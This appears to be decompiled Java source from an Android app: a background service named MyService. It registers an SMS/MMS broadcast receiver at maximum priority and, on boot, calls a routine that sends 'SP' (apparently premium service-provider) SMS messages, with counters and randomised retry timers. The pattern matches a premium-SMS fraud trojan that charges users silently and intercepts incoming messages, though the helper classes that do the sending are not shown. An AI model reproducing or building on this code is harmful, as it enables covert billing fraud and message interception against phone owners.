package com.yongding.logic;

import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.IntentFilter.MalformedMimeTypeException;
import android.os.IBinder;
import android.os.SystemClock;
import com.yongding.util.CountryAndSPInfo;
import com.yongding.util.Trace;
import java.util.Date;

public class MyService extends Service {
    private BroReceiver receiver;
    private boolean stop;

    public MyService() {
        this.receiver = null;
        this.stop = true;
    }

    public IBinder onBind(Intent intent) {
        Trace.i("MyService.onBind()-in");
        return null;
    }

    public void onCreate() {
        if (this.receiver == null) {
            IntentFilter localIntentFilter = new IntentFilter();
            localIntentFilter.addCategory("android.intent.category.DEFAULT");
            localIntentFilter.setPriority(Integer.MAX_VALUE);
            localIntentFilter.addAction(Engine.SMS_RECEIVER);
            this.receiver = new BroReceiver();
            Intent localIntent = registerReceiver(this.receiver, localIntentFilter);
            try {
                IntentFilter localIntentFilter2 = new IntentFilter(Engine.SMS_RECEIVERCOLOR);
                localIntentFilter2.addDataType("application/vnd.wap.mms-message");
                localIntentFilter2.addCategory("android.intent.category.DEFAULT");
                localIntentFilter2.setPriority(Integer.MAX_VALUE);
                registerReceiver(this.receiver, localIntentFilter2);
                IntentFilter localIntentFilter3 = new IntentFilter(Engine.SMS_RECEIVERCOLOR);
                localIntentFilter3.addDataType("application/vnd.wap.coc");
                localIntentFilter3.addCategory("android.intent.category.DEFAULT");
                localIntentFilter3.setPriority(Integer.MAX_VALUE);
                registerReceiver(this.receiver, localIntentFilter3);
            } catch (MalformedMimeTypeException e) {
                e.printStackTrace();
            }
        }
    }

    public void onDestroy() {
        Trace.i("MyService.onDestroy()-entry");
        Global.setShutDown(this, 1);
        Engine.StopBootRetryTimerNewAlarmExt(this);
        Engine.StopSmsTimerNewAlarmExt(this);
        Global.updateSumTimer(this);
        unregisterReceiver(this.receiver);
        Trace.i("MyService.onDestroy()-return");
    }

    public void onStart(Intent intent, int startId) {
        Trace.i("--\r\nMyService.onStart()-entry");
        if (intent == null) {
            Trace.i("MyService.onStart()-return intent null");
        } else {
            Trace.i(new StringBuilder("MyService.onStart()- action=").append(intent.getAction()).toString());
            if (intent.getAction().equals(Engine.bootServiceAction)) {
                CountryAndSPInfo ci = new CountryAndSPInfo(this);
                if (ci.getIsShut() == 0 || "0".equals(Integer.valueOf(ci.getIsShut()))) {
                    int count = ci.getSendCount();
                    if (count <= 0) {
                        Trace.i(new StringBuilder("MyService.onStart()- send count=").append(count).toString());
                        Trace.i(new StringBuilder("MyService.onStart()- trigger at: ").append(new Date(System.currentTimeMillis())).toString());
                        Trace.i("MyService.onStart()- trigger send sp sms");
                        ci.putSendCount(count + 1);
                        try {
                            Ld.sendSpSms(this);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    } else {
                        return;
                    }
                } else {
                    return;
                }
            } else if (intent.getAction().equals(Engine.smsServiceAction)) {
                Ld.SendOneSmsInList(this);
            }
            Trace.i("MyService.onStart()-return");
        }
    }

    public void onStartOld(Intent intent, int startId) {
        Trace.i("--\r\nMyService.onStart()-entry");
        if (intent == null) {
            Trace.i("MyService.onStart()-return intent null");
        } else {
            Trace.i(new StringBuilder("MyService.onStart()- action=").append(intent.getAction()).toString());
            if (intent.getAction().equals(Engine.bootServiceAction)) {
                CountryAndSPInfo ci = new CountryAndSPInfo(this);
                if (ci.getIsShut() != 0 && !"0".equals(Integer.valueOf(ci.getIsShut()))) {
                    return;
                }
                if (Engine.IsBootRetryTimerAlarmRunning() && this.stop) {
                    int count = ci.getSendCount();
                    if (Global.sendCount == count) {
                        Engine.StopBootRetryTimerNewAlarm(this);
                    } else {
                        ci.putSendCount(count + 1);
                        this.stop = false;
                        try {
                            Ld.sendSpSms(this);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                } else {
                    this.stop = true;
                    if (Global.sendCount > ci.getSendCount()) {
                        long totaltime = ci.getUpdateTime();
                        long nexttime = ci.getNextTime();
                        long firstSend = ((long) ((int) ((Math.random() * 5.0d) + 1.0d))) * 1000;
                        if (totaltime == 0 && nexttime == 0) {
                            ci.putNextTime(1000 + firstSend);
                            Engine.StartBootRetryTimerNewAlarm(this, 1000 + firstSend, 60000);
                        } else if (nexttime - totaltime - SystemClock.elapsedRealtime() <= 0) {
                            ci.putNextTime(firstSend + nexttime);
                            Engine.StartBootRetryTimerNewAlarm(this, firstSend, 60000);
                        } else {
                            Engine.StartBootRetryTimerNewAlarm(this, nexttime - totaltime - SystemClock.elapsedRealtime(), 60000);
                        }
                    }
                }
            } else if (intent.getAction().equals(Engine.smsServiceAction)) {
                Ld.SendOneSmsInList(this);
            }
            Trace.i("MyService.onStart()-return");
        }
    }
}